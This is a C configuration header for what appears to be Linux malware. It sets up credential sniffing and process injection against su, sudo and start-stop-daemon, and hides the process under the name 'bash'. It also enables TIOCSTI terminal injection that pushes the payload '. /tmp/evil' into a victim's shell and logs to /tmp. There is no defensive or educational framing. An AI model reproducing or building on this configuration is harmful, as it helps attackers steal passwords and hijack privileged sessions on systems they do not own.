#ifndef CONF_H
#define CONF_H 1

struct state_s;
typedef struct state_s state_t;

#define DEBUG 1
#define PID_MAX 32768 
#define TMPDIR "/tmp/"
#define HIDDEN_NAME "bash"
#define LOG_FILE "/tmp/log.txt"


#define INJECT_LIST { "/bin/su", "/usr/bin/sudo",  "/sbin/start-stop-daemon", NULL }
#define SNIFF_LIST { "/bin/su", "/usr/bin/sudo", NULL }
#define HANDLER_LIST { handle_su, handle_sudo, NULL }
#define MONITOR_MAX 64

#define READER_THREADS 16

void handle_su(state_t *st);
void handle_sudo(state_t *st);

#define ATTEMPT_TIOCSTI 1
#define PUSH_DELAY 2
#define PUSH_PAYLOAD ". /tmp/evil"

#endif
